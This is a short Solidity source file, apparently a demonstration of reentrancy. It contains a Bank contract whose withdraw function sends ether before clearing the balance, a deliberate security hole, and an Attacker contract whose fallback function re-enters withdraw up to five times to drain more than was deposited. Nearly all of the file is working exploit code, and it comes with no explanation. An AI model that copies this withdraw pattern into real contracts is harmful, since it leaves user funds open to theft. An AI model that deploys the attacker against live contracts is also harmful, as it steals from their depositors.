pragma solidity ^0.4.24;

contract Bank{
    mapping (address => uint256) public balances;
    function wallet() constant returns(uint256 result){
        return this.balance;
    }
    function recharge() payable{
        balances[msg.sender]+=msg.value;
    }
    function withdraw(){
        require(msg.sender.call.value(balances[msg.sender])());
        balances[msg.sender]=0;
    }
}

contract Attacker{
    address public bankAddr;
    uint attackCount = 0;
    constructor(address _bank){
        bankAddr = _bank;
    }
    function attack() payable{
        attackCount = 0;
        Bank bank = Bank(bankAddr);
        bank.recharge.value(msg.value)();
        bank.withdraw();
    }
    function () payable{
        if(msg.sender==bankAddr&&attackCount<5){
            attackCount+=1;
            Bank bank = Bank(bankAddr);
            bank.withdraw();
        }
    }
    function wallet() constant returns(uint256 result){
        return this.balance;
    }
}
